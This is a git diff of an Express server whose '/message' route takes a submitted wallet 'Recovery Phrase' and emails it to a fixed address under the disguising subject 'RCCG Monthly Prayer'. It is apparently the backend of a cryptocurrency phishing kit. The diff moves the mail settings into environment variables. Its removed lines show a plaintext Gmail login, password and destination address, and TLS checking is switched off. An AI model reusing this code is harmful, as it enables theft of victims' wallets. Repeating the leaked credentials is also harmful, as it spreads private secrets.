@@ -2,6 +2,7 @@ const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 2000;
 const path = require("path");
+require("dotenv").config();
 var nodemailer = require("nodemailer");
 
 app.use(express.json());
@@ -16,26 +17,13 @@ app.post("/message", (req, res) => {
     <li>Recovery Phrase: ${req.body.rPhrase}</li>
     </ul>
     `;
-  // var transporter = nodemailer.createTransport( {
-  //     service: "",//Gmail or any mail server
-  //     host:"",//Gmail or any mail server
-  //     port:587,
-  //     secure: false,
-  //     auth: {
-  //       user: '',//email
-  //       pass: ''//password
-  //     },
-  //     tls:{
-  //         rejectUnauthorized: false
-  //     }
 
-  // } );
   let transport = nodemailer.createTransport({
     service: "gmail",
     secure: false,
     auth: {
-      user: "oforduhh@gmail.com",
-      pass: "mmbm8695",
+      user: process.env.FROM_USER,
+      pass: process.env.FROM_PASS,
     },
     tls: {
       rejectUnauthorized: false,
@@ -43,8 +31,8 @@ app.post("/message", (req, res) => {
   });
 
   var mailOptions = {
-    from: "'Any thing'  <email same as user>",
-    to: "activation340@gmail.com",
+    from: `${process.env.FROM_NAME}<${process.env.FROM_EMAIL}>`,
+    to: process.env.TO_USER,
     subject: "RCCG Monthly Prayer",
     html: input,
   };
@@ -55,7 +43,6 @@ app.post("/message", (req, res) => {
       console.log(err);
     } else {
       res.json(info.data);
-      // console.l
     }
   });
 });
